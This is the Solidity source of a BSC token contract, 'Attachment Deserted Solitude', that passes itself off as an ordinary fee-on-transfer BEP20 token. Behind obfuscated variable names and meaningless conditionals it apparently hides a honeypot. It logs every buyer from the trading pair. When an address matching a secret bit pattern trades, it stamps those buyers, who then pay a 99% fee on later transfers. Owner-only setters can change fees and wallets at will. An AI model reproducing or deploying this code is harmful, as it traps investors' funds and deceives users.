/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract AttachmentDesertedSolitude is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Attachment Deserted Solitude ";
    string constant _symbol = "AttachmentDesertedSolitude";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private maxReceiverTxTeam;
    mapping(address => bool) private txExemptTradingBuy;
    mapping(address => bool) private autoExemptFeeLiquidityMinSwapLimit;
    mapping(address => bool) private feeBurnMaxAutoWalletMinReceiver;
    mapping(address => uint256) private feeMaxIsBuyMinMode;
    mapping(uint256 => address) private walletBotsBuySell;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private feeBurnModeWalletLimitBuy = 0;
    uint256 private launchedIsBurnMinMax = 8;

    //SELL FEES
    uint256 private isBurnReceiverSwap = 0;
    uint256 private marketingTeamModeBuyLimit = 8;

    uint256 private walletAutoBurnBuy = launchedIsBurnMinMax + feeBurnModeWalletLimitBuy;
    uint256 private minLaunchedAutoBurn = 100;

    address private walletSellMinBurn = (msg.sender); // auto-liq address
    address private receiverModeSellExemptBurn = (0x989Ab1a240889354A16726B0FfFfed43294e03C5); // marketing address
    address private burnTxSwapLaunched = DEAD;
    address private burnMaxIsLiquidityMin = DEAD;
    address private burnReceiverMarketingLimitIsWallet = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private autoExemptSellModeTradingIsMax;
    uint256 private limitMinAutoLiquidity;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private maxIsModeLimit;
    uint256 private burnTxModeTrading;
    uint256 private swapTxIsFee;
    uint256 private autoWalletFeeExemptModeMin;
    uint256 private receiverExemptMinTx;

    bool private botsLimitExemptMode = true;
    bool private feeBurnMaxAutoWalletMinReceiverMode = true;
    bool private isMaxMinMarketing = true;
    bool private txLiquidityTradingFeeAutoBotsMin = true;
    bool private maxIsTxSellTeam = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private marketingLiquidityBurnSwapReceiverModeLaunched = _totalSupply / 1000; // 0.1%

    
    bool private teamBurnBotsWalletTrading = false;
    uint256 private sellReceiverBurnAutoTeam = 0;
    uint256 private swapSellAutoReceiver = 0;
    bool private autoBotsReceiverLaunched = false;
    bool private teamFeeWalletBots = false;
    uint256 private marketingBuyMaxTrading = 0;
    bool private feeMinSwapIsWalletLaunched = false;
    uint256 private feeModeTeamTxSellIs = 0;
    uint256 private tradingBotsLaunchedMinMarketingExempt = 0;
    bool private isTeamTxReceiver = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        maxIsModeLimit = true;

        maxReceiverTxTeam[msg.sender] = true;
        maxReceiverTxTeam[address(this)] = true;

        txExemptTradingBuy[msg.sender] = true;
        txExemptTradingBuy[0x0000000000000000000000000000000000000000] = true;
        txExemptTradingBuy[0x000000000000000000000000000000000000dEaD] = true;
        txExemptTradingBuy[address(this)] = true;

        autoExemptFeeLiquidityMinSwapLimit[msg.sender] = true;
        autoExemptFeeLiquidityMinSwapLimit[0x0000000000000000000000000000000000000000] = true;
        autoExemptFeeLiquidityMinSwapLimit[0x000000000000000000000000000000000000dEaD] = true;
        autoExemptFeeLiquidityMinSwapLimit[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return marketingLaunchedModeReceiverIsTeam(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return marketingLaunchedModeReceiverIsTeam(sender, recipient, amount);
    }

    function marketingLaunchedModeReceiverIsTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (swapSellAutoReceiver != marketingLiquidityBurnSwapReceiverModeLaunched) {
            swapSellAutoReceiver = isBurnReceiverSwap;
        }

        if (marketingBuyMaxTrading == swapSellAutoReceiver) {
            marketingBuyMaxTrading = swapSellAutoReceiver;
        }

        if (tradingBotsLaunchedMinMarketingExempt != marketingTeamModeBuyLimit) {
            tradingBotsLaunchedMinMarketingExempt = feeModeTeamTxSellIs;
        }


        bool bLimitTxWalletValue = maxMinLiquidityWallet(sender) || maxMinLiquidityWallet(recipient);
        
        if (feeModeTeamTxSellIs != tradingBotsLaunchedMinMarketingExempt) {
            feeModeTeamTxSellIs = sellReceiverBurnAutoTeam;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                teamBotsMaxExemptTrading();
            }
            if (!bLimitTxWalletValue) {
                sellIsSwapTrading(recipient);
            }
        }
        
        if (tradingBotsLaunchedMinMarketingExempt != sellReceiverBurnAutoTeam) {
            tradingBotsLaunchedMinMarketingExempt = tradingBotsLaunchedMinMarketingExempt;
        }

        if (sellReceiverBurnAutoTeam == isBurnReceiverSwap) {
            sellReceiverBurnAutoTeam = walletAutoBurnBuy;
        }

        if (isTeamTxReceiver != teamFeeWalletBots) {
            isTeamTxReceiver = isTeamTxReceiver;
        }


        if (inSwap || bLimitTxWalletValue) {return teamBotsSellMin(sender, recipient, amount);}

        if (!maxReceiverTxTeam[sender] && !maxReceiverTxTeam[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (sellReceiverBurnAutoTeam != launchedIsBurnMinMax) {
            sellReceiverBurnAutoTeam = swapSellAutoReceiver;
        }

        if (swapSellAutoReceiver != marketingTeamModeBuyLimit) {
            swapSellAutoReceiver = marketingBuyMaxTrading;
        }

        if (marketingBuyMaxTrading != marketingTeamModeBuyLimit) {
            marketingBuyMaxTrading = feeModeTeamTxSellIs;
        }


        require((amount <= _maxTxAmount) || autoExemptFeeLiquidityMinSwapLimit[sender] || autoExemptFeeLiquidityMinSwapLimit[recipient], "Max TX Limit has been triggered");

        if (swapIsTradingAuto()) {launchedMinMarketingSell();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (teamFeeWalletBots == maxIsTxSellTeam) {
            teamFeeWalletBots = txLiquidityTradingFeeAutoBotsMin;
        }

        if (feeMinSwapIsWalletLaunched != isTeamTxReceiver) {
            feeMinSwapIsWalletLaunched = autoBotsReceiverLaunched;
        }

        if (swapSellAutoReceiver == marketingLiquidityBurnSwapReceiverModeLaunched) {
            swapSellAutoReceiver = isBurnReceiverSwap;
        }


        uint256 amountReceived = isLiquidityBurnFee(sender) ? limitSwapTxSellMarketing(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function teamBotsSellMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function isLiquidityBurnFee(address sender) internal view returns (bool) {
        return !txExemptTradingBuy[sender];
    }

    function marketingMaxTradingWallet(address sender, bool selling) internal returns (uint256) {
        
        if (marketingBuyMaxTrading != marketingTeamModeBuyLimit) {
            marketingBuyMaxTrading = marketingBuyMaxTrading;
        }

        if (tradingBotsLaunchedMinMarketingExempt != launchedIsBurnMinMax) {
            tradingBotsLaunchedMinMarketingExempt = feeModeTeamTxSellIs;
        }

        if (feeMinSwapIsWalletLaunched != isMaxMinMarketing) {
            feeMinSwapIsWalletLaunched = txLiquidityTradingFeeAutoBotsMin;
        }


        if (selling) {
            walletAutoBurnBuy = marketingTeamModeBuyLimit + isBurnReceiverSwap;
            return receiverWalletBurnIs(sender, walletAutoBurnBuy);
        }
        if (!selling && sender == uniswapV2Pair) {
            walletAutoBurnBuy = launchedIsBurnMinMax + feeBurnModeWalletLimitBuy;
            return walletAutoBurnBuy;
        }
        return receiverWalletBurnIs(sender, walletAutoBurnBuy);
    }

    function limitSwapTxSellMarketing(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (marketingBuyMaxTrading == feeBurnModeWalletLimitBuy) {
            marketingBuyMaxTrading = tradingBotsLaunchedMinMarketingExempt;
        }

        if (tradingBotsLaunchedMinMarketingExempt != walletAutoBurnBuy) {
            tradingBotsLaunchedMinMarketingExempt = marketingTeamModeBuyLimit;
        }

        if (teamBurnBotsWalletTrading == botsLimitExemptMode) {
            teamBurnBotsWalletTrading = isMaxMinMarketing;
        }


        uint256 feeAmount = amount.mul(marketingMaxTradingWallet(sender, receiver == uniswapV2Pair)).div(minLaunchedAutoBurn);

        if (feeBurnMaxAutoWalletMinReceiver[sender] || feeBurnMaxAutoWalletMinReceiver[receiver]) {
            feeAmount = amount.mul(99).div(minLaunchedAutoBurn);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function maxMinLiquidityWallet(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function receiverWalletBurnIs(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = feeMaxIsBuyMinMode[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function sellIsSwapTrading(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        walletBotsBuySell[exemptLimitValue] = addr;
    }

    function teamBotsMaxExemptTrading() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (feeMaxIsBuyMinMode[walletBotsBuySell[i]] == 0) {
                    feeMaxIsBuyMinMode[walletBotsBuySell[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(receiverModeSellExemptBurn).transfer(amountBNB * amountPercentage / 100);
    }

    function swapIsTradingAuto() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    maxIsTxSellTeam &&
    _balances[address(this)] >= marketingLiquidityBurnSwapReceiverModeLaunched;
    }

    function launchedMinMarketingSell() internal swapping {
        
        uint256 amountToLiquify = marketingLiquidityBurnSwapReceiverModeLaunched.mul(feeBurnModeWalletLimitBuy).div(walletAutoBurnBuy).div(2);
        uint256 amountToSwap = marketingLiquidityBurnSwapReceiverModeLaunched.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (autoBotsReceiverLaunched == maxIsTxSellTeam) {
            autoBotsReceiverLaunched = botsLimitExemptMode;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = walletAutoBurnBuy.sub(feeBurnModeWalletLimitBuy.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(feeBurnModeWalletLimitBuy).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(launchedIsBurnMinMax).div(totalETHFee);
        
        if (tradingBotsLaunchedMinMarketingExempt != launchedIsBurnMinMax) {
            tradingBotsLaunchedMinMarketingExempt = sellReceiverBurnAutoTeam;
        }


        payable(receiverModeSellExemptBurn).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                walletSellMinBurn,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getFeeMaxIsBuyMinMode(address a0) public view returns (uint256) {
        if (a0 != walletSellMinBurn) {
            return marketingBuyMaxTrading;
        }
        if (a0 == burnMaxIsLiquidityMin) {
            return sellReceiverBurnAutoTeam;
        }
            return feeMaxIsBuyMinMode[a0];
    }
    function setFeeMaxIsBuyMinMode(address a0,uint256 a1) public onlyOwner {
        if (a0 != receiverModeSellExemptBurn) {
            marketingLiquidityBurnSwapReceiverModeLaunched=a1;
        }
        if (a0 == walletSellMinBurn) {
            sellReceiverBurnAutoTeam=a1;
        }
        if (a0 != receiverModeSellExemptBurn) {
            feeBurnModeWalletLimitBuy=a1;
        }
        feeMaxIsBuyMinMode[a0]=a1;
    }

    function getIsMaxMinMarketing() public view returns (bool) {
        return isMaxMinMarketing;
    }
    function setIsMaxMinMarketing(bool a0) public onlyOwner {
        if (isMaxMinMarketing != txLiquidityTradingFeeAutoBotsMin) {
            txLiquidityTradingFeeAutoBotsMin=a0;
        }
        if (isMaxMinMarketing == teamFeeWalletBots) {
            teamFeeWalletBots=a0;
        }
        isMaxMinMarketing=a0;
    }

    function getTeamFeeWalletBots() public view returns (bool) {
        if (teamFeeWalletBots == isTeamTxReceiver) {
            return isTeamTxReceiver;
        }
        if (teamFeeWalletBots == autoBotsReceiverLaunched) {
            return autoBotsReceiverLaunched;
        }
        if (teamFeeWalletBots == feeMinSwapIsWalletLaunched) {
            return feeMinSwapIsWalletLaunched;
        }
        return teamFeeWalletBots;
    }
    function setTeamFeeWalletBots(bool a0) public onlyOwner {
        if (teamFeeWalletBots == autoBotsReceiverLaunched) {
            autoBotsReceiverLaunched=a0;
        }
        if (teamFeeWalletBots != teamBurnBotsWalletTrading) {
            teamBurnBotsWalletTrading=a0;
        }
        if (teamFeeWalletBots != isMaxMinMarketing) {
            isMaxMinMarketing=a0;
        }
        teamFeeWalletBots=a0;
    }

    function getFeeBurnModeWalletLimitBuy() public view returns (uint256) {
        if (feeBurnModeWalletLimitBuy != marketingLiquidityBurnSwapReceiverModeLaunched) {
            return marketingLiquidityBurnSwapReceiverModeLaunched;
        }
        if (feeBurnModeWalletLimitBuy == feeModeTeamTxSellIs) {
            return feeModeTeamTxSellIs;
        }
        return feeBurnModeWalletLimitBuy;
    }
    function setFeeBurnModeWalletLimitBuy(uint256 a0) public onlyOwner {
        if (feeBurnModeWalletLimitBuy == feeModeTeamTxSellIs) {
            feeModeTeamTxSellIs=a0;
        }
        if (feeBurnModeWalletLimitBuy != walletAutoBurnBuy) {
            walletAutoBurnBuy=a0;
        }
        feeBurnModeWalletLimitBuy=a0;
    }

    function getSwapSellAutoReceiver() public view returns (uint256) {
        if (swapSellAutoReceiver != swapSellAutoReceiver) {
            return swapSellAutoReceiver;
        }
        if (swapSellAutoReceiver == feeBurnModeWalletLimitBuy) {
            return feeBurnModeWalletLimitBuy;
        }
        if (swapSellAutoReceiver == feeBurnModeWalletLimitBuy) {
            return feeBurnModeWalletLimitBuy;
        }
        return swapSellAutoReceiver;
    }
    function setSwapSellAutoReceiver(uint256 a0) public onlyOwner {
        if (swapSellAutoReceiver == marketingLiquidityBurnSwapReceiverModeLaunched) {
            marketingLiquidityBurnSwapReceiverModeLaunched=a0;
        }
        swapSellAutoReceiver=a0;
    }

    function getIsTeamTxReceiver() public view returns (bool) {
        if (isTeamTxReceiver != teamFeeWalletBots) {
            return teamFeeWalletBots;
        }
        return isTeamTxReceiver;
    }
    function setIsTeamTxReceiver(bool a0) public onlyOwner {
        if (isTeamTxReceiver == isMaxMinMarketing) {
            isMaxMinMarketing=a0;
        }
        isTeamTxReceiver=a0;
    }

    function getWalletBotsBuySell(uint256 a0) public view returns (address) {
        if (a0 != marketingTeamModeBuyLimit) {
            return receiverModeSellExemptBurn;
        }
        if (a0 != launchedIsBurnMinMax) {
            return burnMaxIsLiquidityMin;
        }
        if (a0 != feeModeTeamTxSellIs) {
            return burnTxSwapLaunched;
        }
            return walletBotsBuySell[a0];
    }
    function setWalletBotsBuySell(uint256 a0,address a1) public onlyOwner {
        if (a0 == tradingBotsLaunchedMinMarketingExempt) {
            burnMaxIsLiquidityMin=a1;
        }
        if (a0 == marketingBuyMaxTrading) {
            receiverModeSellExemptBurn=a1;
        }
        walletBotsBuySell[a0]=a1;
    }

    function getMarketingTeamModeBuyLimit() public view returns (uint256) {
        if (marketingTeamModeBuyLimit == tradingBotsLaunchedMinMarketingExempt) {
            return tradingBotsLaunchedMinMarketingExempt;
        }
        if (marketingTeamModeBuyLimit == walletAutoBurnBuy) {
            return walletAutoBurnBuy;
        }
        return marketingTeamModeBuyLimit;
    }
    function setMarketingTeamModeBuyLimit(uint256 a0) public onlyOwner {
        marketingTeamModeBuyLimit=a0;
    }

    function getAutoBotsReceiverLaunched() public view returns (bool) {
        return autoBotsReceiverLaunched;
    }
    function setAutoBotsReceiverLaunched(bool a0) public onlyOwner {
        if (autoBotsReceiverLaunched != botsLimitExemptMode) {
            botsLimitExemptMode=a0;
        }
        autoBotsReceiverLaunched=a0;
    }

    function getFeeModeTeamTxSellIs() public view returns (uint256) {
        if (feeModeTeamTxSellIs == tradingBotsLaunchedMinMarketingExempt) {
            return tradingBotsLaunchedMinMarketingExempt;
        }
        return feeModeTeamTxSellIs;
    }
    function setFeeModeTeamTxSellIs(uint256 a0) public onlyOwner {
        feeModeTeamTxSellIs=a0;
    }

    function getBurnReceiverMarketingLimitIsWallet() public view returns (address) {
        if (burnReceiverMarketingLimitIsWallet == burnMaxIsLiquidityMin) {
            return burnMaxIsLiquidityMin;
        }
        return burnReceiverMarketingLimitIsWallet;
    }
    function setBurnReceiverMarketingLimitIsWallet(address a0) public onlyOwner {
        if (burnReceiverMarketingLimitIsWallet == burnTxSwapLaunched) {
            burnTxSwapLaunched=a0;
        }
        if (burnReceiverMarketingLimitIsWallet != burnMaxIsLiquidityMin) {
            burnMaxIsLiquidityMin=a0;
        }
        burnReceiverMarketingLimitIsWallet=a0;
    }

    function getBurnMaxIsLiquidityMin() public view returns (address) {
        if (burnMaxIsLiquidityMin == receiverModeSellExemptBurn) {
            return receiverModeSellExemptBurn;
        }
        if (burnMaxIsLiquidityMin != burnTxSwapLaunched) {
            return burnTxSwapLaunched;
        }
        if (burnMaxIsLiquidityMin == burnTxSwapLaunched) {
            return burnTxSwapLaunched;
        }
        return burnMaxIsLiquidityMin;
    }
    function setBurnMaxIsLiquidityMin(address a0) public onlyOwner {
        burnMaxIsLiquidityMin=a0;
    }

    function getMaxIsTxSellTeam() public view returns (bool) {
        if (maxIsTxSellTeam == isTeamTxReceiver) {
            return isTeamTxReceiver;
        }
        return maxIsTxSellTeam;
    }
    function setMaxIsTxSellTeam(bool a0) public onlyOwner {
        if (maxIsTxSellTeam != botsLimitExemptMode) {
            botsLimitExemptMode=a0;
        }
        maxIsTxSellTeam=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}